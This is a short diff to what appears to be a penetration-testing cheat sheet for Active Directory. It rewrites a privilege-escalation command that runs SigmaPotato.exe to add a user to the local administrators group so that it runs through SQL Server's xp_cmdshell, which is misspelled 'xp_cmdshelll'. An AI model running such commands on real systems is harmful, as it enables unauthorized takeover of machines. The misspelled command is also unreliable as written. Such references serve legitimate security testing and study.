@@ -742,7 +742,7 @@ bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> 
 
   ### Privesc to local administrator as db_admin
   ```bash
-  SigmaPotato.exe "net localgroup administrator <user> /add"
+  xp_cmdshelll 'SigmaPotato.exe "net localgroup administrator <user> /add"'
   ```
 
 </details>
